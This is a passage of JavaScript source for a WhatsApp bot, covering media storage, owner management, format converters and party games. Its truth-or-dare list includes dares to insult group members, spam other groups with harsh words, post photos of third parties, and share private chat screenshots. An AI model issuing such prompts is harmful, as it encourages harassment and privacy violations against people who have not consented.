if (ImageNano.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
ImageNano.push(q)
await fsx.copy(delb, `./data/NanoMedia/image/${q}.jpg`)
fs.writeFileSync('./data/NanoMedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(delb)
replynano(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the image name')
if (!ImageNano.includes(q)) return replynano("The name does not exist in the database")
let wanu = ImageNano.indexOf(q)
ImageNano.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonimage.json', JSON.stringify(ImageNano))
fs.unlinkSync(`./data/NanoMedia/image/${q}.jpg`)
replynano(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageNano) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNano.length}*`
replynano(teks)
}
break
case 'addsticker':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the sticker name?')
if (NanoSticker.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoSticker.push(q)
await fsx.copy(delb, `./data/NanoMedia/sticker/${q}.webp`)
fs.writeFileSync('./data/NanoMedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(delb)
replynano(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the sticker name')
if (!NanoSticker.includes(q)) return replynano("The name does not exist in the database")
let wanu = NanoSticker.indexOf(q)
NanoSticker.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonsticker.json', JSON.stringify(NanoSticker))
fs.unlinkSync(`./data/NanoMedia/sticker/${q}.webp`)
replynano(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of NanoSticker) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${NanoSticker.length}*`
replynano(teks)
}
break
case 'addvn':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Whats the audio name?')
if (NanoVoiceNote.includes(q)) return replynano("The name is already in use")
let delb = await NanoBotz.downloadAndSaveMediaMessage(quoted)
NanoVoiceNote.push(q)
await fsx.copy(delb, `./data/assets/audio/${q}.mp3`)
fs.writeFileSync('./data/NanoMedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(delb)
replynano(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!DanzTheCreator) return reply(mess.only.owner)
if (args.length < 1) return replynano('Enter the vn name')
if (!NanoVoiceNote.includes(q)) return replynano("The name does not exist in the database")
let wanu = NanoVoiceNote.indexOf(q)
NanoVoiceNote.splice(wanu, 1)
fs.writeFileSync('./data/NanoMedia/database/xeonvn.json', JSON.stringify(NanoVoiceNote))
fs.unlinkSync(`./data/assets/audio/${q}.mp3`)
replynano(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of NanoVoiceNote) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${NanoVoiceNote.length}*`
replynano(teks)
}
break
case 'addowner':
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await NanoBotz.onWhatsApp(bnnd)
if (ceknye.length == 0) return replynano(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replynano(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args[0]) return replynano(`Use ${prefix+command} nomor\nExample ${prefix+command} 234xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replynano(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let NanoBotz of prem) {
teks += `- ${NanoBotz}\n`
}
teks += `\n*Total : ${prem.length}*`
NanoBotz.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
if (!m.quoted) return replynano('Reply Message!')
if (!m.quoted.fileSha256) return replynano('SHA256 Hash Missing')
if (!text) return replynano(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replynano('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replynano(`Done!`)
            }
            break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replynano(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replynano('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replynano(`Done!`)
            }
            break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
NanoBotz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!m.quoted) return replynano('Reply Message!')
if (!m.quoted.fileSha256) return replynano('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replynano('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replynano('Done!')
            }
            break
case 'addmsg': {
if (!m.quoted) return replynano('Reply Message You Want To Save In Database')
if (!text) return replynano(`Example : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replynano(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replynano(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
if (!text) return replynano(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replynano(`'${text}' not listed in the message list`)
NanoBotz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replynano(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replynano(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replynano(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif': {
               if (!DanzTheCreator) return reply(mess.only.owner)
               if (!text) return replynano(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replynano(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await NanoBotz.fetchStatus(who)
    replynano(bio.status)
  } catch {
    if (text) return replynano(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await NanoBotz.fetchStatus(who)
      replynano(bio.status)
    } catch {
      return replynano(`biodatanya pribadi atau Anda belum membalas pesan orang tersebut!`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!quoted) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replynano(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await NanoBotz.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await NanoBotz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replynano(`Success`)
} else {
var memeg = await NanoBotz.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replynano(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!args.join(" ")) return replynano(`Use ${prefix+command} groupname`)
try {
let cret = await NanoBotz.groupCreate(args.join(" "), [])
let response = await NanoBotz.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
NanoBotz.sendMessage(m.chat, { text:teks, mentions: await NanoBotz.parseMention(teks)}, {quoted:m})
} catch {
reply('well error Bro report to the owner to be fixed')
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
NanoBotz.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
NanoBotz.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
if (!quoted) return replynano('Balas ke Stiker')
if (!/webp/.test(mime)) return replynano(`stiker balasan dengan judul *${prefix + command}*`)
reply(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
let media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await NanoBotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Conversion webp to video' } }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replynano(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replynano(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            NanoBotz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replynano(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replynano(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            NanoBotz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
if (!quoted) return replynano('Reply video')
if (!/webp/.test(mime)) return replynano(`reply sticker with caption *${prefix + command}*`)
reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await NanoBotz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replynano(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await NanoBotz.sendMessage(from, { image: medi, caption:"Here he is!!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
"Eat 2 tablespoons of rice without any side dishes, if it feels heavy, you can drink.",
"Name the person who makes you speechless",
"Call your crush/girlfriend now and send a screenshot here",
"Send emotes only every time you type in a chat group/private chat for 1 day.",
"Say 'Welcome to Who Wants To Be a Millionaire!' to all the groups you have",
"Call your ex and say you miss him",
"sing the chorus of the last song you played",
"Record a voice for your ex/girlfriend, say 'Hi (name), want to call, wait a minute. I really miss you",
"Hit the table (at home) until you get scolded for being noisy",
"Tell a stranger I was just told that I was your first sibling, we separated, then I had plastic surgery and you love him/her",
"Mention your ex's name",
"make 1 rhyme for group members!",
"Send your WhatsApp conversation list",
"Chat with strangers in ghetto language then capture screen here",
"Tell your own version of embarrassing things",
"Tag someone you hate",
"Pretend to be affected, for example: affected by dogs, affected by grasshoppers, affected by refrigerators, etc.",
"Change the name to *I AM DONKEY* for 24 hours",
"Shout *ma chuda ma chuda ma chuda* in front of your house",
"Take a photo/portrait of your girlfriend or crush and send it here",
"Tell me the type of boyfriend you like!",
"Say *I have a crush on you, will you be my boyfriend?* to the opposite sex, the last time you talked to him (send it on WA/Telegram), wait until he replies, if so, give it here",
"Record your voice reading *titar ke age do titar, titar ke piche do titar*",
"Chat jokes with your ex and say *I love you, please come back.* without mentioning that it's a challenge!",
"Chat with WhatsApp contacts in order according to your phone's battery percentage, then say I'm lucky to have you!",
"Change you name to *I am a child of God* for 5 hours",
"Type in your native language for 24 hours",
"Use Ariana grande photo for 3 days",
"Send a song quote then tag members who match the quote",
"Send a voice message saying Can I call you darling?",
"Screenshot of the last conversation on your WhatsApp",
"Say *YOU ARE VERY BEAUTIFUL, DON'T LIE* to your same sex friends!",
"Call one of the group members and say something rude to them",
"Act like a chicken in front of your parents",
"Take a book at random and read a page aloud and record the voice and post it here",
"Open the front door of your house and bark like a wolf for 10 seconds",
"Take an embarrassing selfie and make it your profile photo",
"Let the group choose a word and a song that is known. You have to sing the song and send it as a voice message here",
"Walk supported with your elbows and knees as long as you can",
"sing the national anthem in voice messages",
"Do 30 seconds of breakdancing in the living room",
"Tell me a sad story that you know",
"Create a short twerk dance video and upload it as a status for 5 minutes",
"Eat a piece of raw garlic",
"Show the last five people you messaged and fill in their messages",
"Make your full name as status for 5 hours",
"Create a short, unfiltered dance video with just music and upload it as a status for 5 hours",
"Call your best friend, bullshit",
"Make a photo of yourself without a filter as a status for 10 minutes",
"Say 'I love Oli London' in a voice message 😄",
"Send your ex a message and tell him you still like him",
"Call your crush/girlfriend/friend now and screenshot here",
"Be rude to one of the group members in a private conversation and say you're ugly, a burden",
"Say YOU'RE BEAUTIFUL/HANDSOME to one of the people at the top of your pinlist or the first person in your conversation list",
"Send a voice message and say Can I call you Baby. If you are a man, say a woman's name. If you are a woman, say a man's name",
"Write I love you (the name of a random group member who is online) in a private conversation (if you are a man, write a woman's name; if you are a woman, write a man's name), take a screenshot and post it here",
"Use a Nollywood actor's photo as your profile photo for 3 days",
"Make your crush's photo a status with the caption 'This is my crush'",
"Change the name to *I AM GAY* for 5 hours",
"Chat with one of your contacts on WhatsApp and say I will be your girlfriend for 5 hours",
"Send a voice message and say I have a crush on you, will you be my girlfriend? to a random person from the group (if you're a girl, choose a boy's name; if you're a boy, choose a girl's name)",
"Spank your ass hard and send a slapping sound via voice message 😂",
"Name your girlfriend's type and send her photo here with the caption 'The ugliest woman/man in the world'",
"Shout 'bravooooooooo' and send it via voice message here",
"Take a photo of your face and post it here",
"Send a photo of yourself with the caption I'm a lesbian",
"Shout using harsh words and send via voice message",
"Scream you bastard in front of your mother or father",
"Change the name to *I'm stupid for 24 hours*",
"Hit yourself steadily and send the sound of the hit via voice message 😂",
"Say i love to fuck via voice message",
"Send a photo of your girlfriend or crush here",
"Create any TikTok dance challenge video and upload as status, you can delete it after 5 hours",
"Unfriending your best friend for 5 hours without telling him is a challenge",
"Tell one of your friends that you love him and want to marry him, without telling him that it is a challenge",
"Say I love my daddy via voice message",
"Write I feel horny and upload it as a status, you can only delete it after 5 hours",
"Write I'm a lesbian and upload it as a status, you can only delete it after 5 hours",
"Kiss your mom or dad and say I love you 😌",
"Make your father's name as status for 5 hours",
"Send harsh words in any group, except this group, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              NanoBotz.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
        break
       case 'truth':
              const truth =[
"Have you ever liked someone? How long?",
    "If you could or if you wanted, which chat group or outside group would you like to be friends with? (can be different/same type)",
    "What is your biggest fear?",
    "Have you ever liked someone and felt that that person liked you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever taken money from your father or mother? The reason?",
    "What makes you happy when you're sad?",
    "Have you ever had feelings of one-way love? If yes, who? How did you feel, bro?",
    "Have you ever been someone's mistress?",
    "The most feared thing?",
    "Who is the most influential person in your life?",
    "What achievements have you achieved this year?",
    "Who is the person who can make you cool?",
    "Who is the person who has made you the most happy?",
    "Who is closest to your ideal partner type here?",
    "Who do you like to play with?",
    "Have you ever rejected someone? reasons why?",
    "Name an incident that hurt your feelings that you still remember",
    "What achievements have you achieved this year?",
    "Your worst habit at school?",
    "What song do you sing most often in the bathroom?",
    "Have you ever had a near death experience?",
    "When was the last time you were so angry? Why?",
    "Who was the last person to call you?",
    "Do you have any hidden talents? What are they?",
    "What word do you hate the most?",
    "What was the last YouTube video you watched?",
    "What was the last thing you googled?",
    "In this group, with whom would you like to exchange your life for a week?",
    "What is the scariest thing that has ever happened to you?",
    "Have you ever farted and blamed it on someone else?",
    "When was the last time you made someone else cry?",
    "Have you ever lost track of a friend?",
    "Have you ever seen a corpse?",
    "Which member of your family bothers you the most and why?",
    "If you had to delete one app from your phone, which app would you delete?",
    "What apps do you waste the most time on?",
    "Have you ever pretended to be sick to get home from school?",
    "What's the most embarrassing thing in your room?",
    "If you were stranded on a desert island, what five things would you take with you?",
    "Have you ever laughed so hard your pee was wet?",
    "Do you smell your own farts?",
    "Have you ever peed in bed while sleeping?",
    "What's the biggest mistake you've ever made?",
    "Have you ever cheated on an exam?",
    "What's the worst thing you've ever done?",
    "When was the last time you cried?",
    "Among your parents, who do you love the most?",
    "Do you sometimes put your fingers in your nostrils?",
    "Who was your crush when you were at school?",
    "Speaking honestly, do you like a boy in this group?",
    "Have you ever liked someone? How long?",
    "Do you have a boyfriend? What is your biggest fear?",
    "Have you ever liked someone and felt that that person liked you too?",
    "What is the name of your friend's ex-girlfriend that you secretly liked?",
    "Have you ever taken money from your mother or father? What is the reason?",
    "What makes you happy when you're sad?",
    "Do you like anyone in this group? If yes, who?",
    "Have you ever been cheated on by someone?",
    "Who is the most important person in your life?",
    "What achievements have you achieved this year?",
    "Who is the person who can make you happy when you are sad?",
    "Who is the person who has ever made you feel uncomfortable?",
    "Have you ever lied to your parents?",
    "Do you still like your ex-boyfriend?",
    "Who do you want to play with?",
    "Have you ever stolen something big? What was the reason?",
    "Name an incident that has hurt you and that you still remember?",
    "What achievements have you achieved this year?",
    "What was your worst habit at school?",
    "Do you love the creator of this bot, Dani 😄",
    "Have you ever thought about taking revenge on the teacher?",
    "Do you like the current prime minister of your country?",
    "Are you vegetarian or non-vegetarian?",
    "If you could become invisible, what would you do first?",
    "What secret do you keep from your parents?",
    "Who is your secret crush?",
    "Who was the last person you peeked at on social media?",
    "If a genie gave you three wishes, what would you ask for?",
    "What is your biggest regret?",
    "What kind of animal do you think is most similar to you?",
    "How many selfies do you take in a day?",
    "What was your favorite show from childhood?",
    "If you could be a fictional character in one day, who would you choose?",
    "Who do you text the most with?",
    "What's the biggest lie you've ever told your parents?",
    "Which celebrity is your idol?",
    "The strangest dream you have ever had?",
    "Do you play PUBG? If yes, please provide your ID number."
]
              const Nanotruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              NanoBotz.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Nanotruth }, {quoted:m})
              break
              case 'checkme':
                neme = args.join(" ")
                bet = `${sender}`
                var sifat = ["Good "," not friendly "," chapri "," nibba/nibbi "," disturbing "," broken "," angry people "," polite "," burden "," great "," croge "," liar"]
                var hoby = ['Cooking', 'dancing', 'playing', 'playing games', 'painting', 'helping others', 'watching anime', 'reading', 'cycling', 'singing', 'talking','Sharing Meme', 'Drawing', 'Spending Parents','Money', 'Playing Truth or Dare', 'Spending Time Alone']
                var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var cakep = ['Yes', 'No', 'Very Bad', 'Very Handsome']
                var wetak= ['Caring', 'generous',' angry people ',' sorry ',' submiss', 'good', 'forgive me', 'good -hearted', 'patient', 'uwu', 'best', 'help']
                var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                var sipat = sifat[Math.floor(Math.random() * sifat.length)]
                var biho = hoby[Math.floor(Math.random() * hoby.length)]
                var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
                var senga = arp[Math.floor(Math.random() * arp.length)]
                var chakep = cakep[Math.floor(Math.random() * cakep.length)]
                var watak = wetak[Math.floor(Math.random() * wetak.length)]
                var baik = baikk[Math.floor(Math.random() * baikk.length)]
                var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
                var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
                var berani = berhani[Math.floor(Math.random() * berhani.length)]
                var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
                 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*
      
      *Name :* ${pushname}
      *characteristics :* ${sipat}
      *Hobby :* ${biho}
      *bucin :* ${bhucin}%
      *Great :* ${senga}%
      *Handsome :* ${chakep}
      *Character :* ${watak}
      *Good morals :* ${baik}%
      *Bad morals :* ${burug}%
      *Intelligence :* ${cerdas}%
      *Courage :* ${berani}%
      *Coward :* ${takut}%
      
      *≡═══《 CHECK PROPERTIES 》═══≡*`
                buff = await getBuffer(defaultpp)
      NanoBotz.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
      break
case 'toimg': {
	NanoBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replynano(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await NanoBotz.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            NanoBotz.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return replynano(`Please reply to non animated sticker`)
    }
    break
case 'swm': case 'steal': case 'stickerwm': case 'take': case 'wm': {
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : `yoy`
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await NanoBotz.sendMessage(from,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
	break


case 'quotechat':
    case 'xquote':
    case 'quotly':
case 'qc': {
const colorMap = {
  hitam: "#000000", putih: "#ffffff", merah: "#ff0000", biru: "#0000ff", kuning: "#ffff00",
  hijau: "#00ff00", ijo: "#00ff00", ungu: "#800080", pink: "#ffc0cb", oranye: "#ffa500",
  coklat: "#8b4513", abu: "#808080", pink_pastel: "#ffd1dc", cyan: "#00ffff", toska: "#40e0d0",
  lavender: "#e6e6fa", mint: "#98ff98", peach: "#ffcccb", salem: "#fa8072", emas: "#ffd700",
  silver: "#c0c0c0", navy: "#000080", maroon: "#800000", coklat_muda: "#d2b48c",
  biru_muda: "#add8e6", hijau_muda: "#90ee90", kuning_pastel: "#fdfd96", merah_muda: "#ff6961",
  biru_laut: "#4682b4", hijau_lumut: "#556b2f", ungu_muda: "#dda0dd", abu_muda: "#d3d3d3",
  karamel: "#c68e17", hijau_toska: "#20b2aa", biru_langit: "#87ceeb", coklat_tua: "#654321",
  magenta: "#ff00ff", indigo: "#4b0082", krem: "#fffdd0", coklat_kopi: "#4b2e2a",
  plum: "#dda0dd", coral: "#ff7f50", emas_tua: "#b8860b", biru_laut_tua: "#00008b",
  merah_bata: "#8b0000", salmon: "#fa8072", tomato: "#ff6347", merah_anggur: "#800020",
  sienna: "#a0522d", biru_kehijauan: "#5f9ea0", hijau_zamrud: "#50c878", aquamarine: "#7fffd4",
  chartreuse: "#7fff00", lime_green: "#32cd32", perak: "#c0c0c0", teal: "#008080", khaki: "#f0e68c",
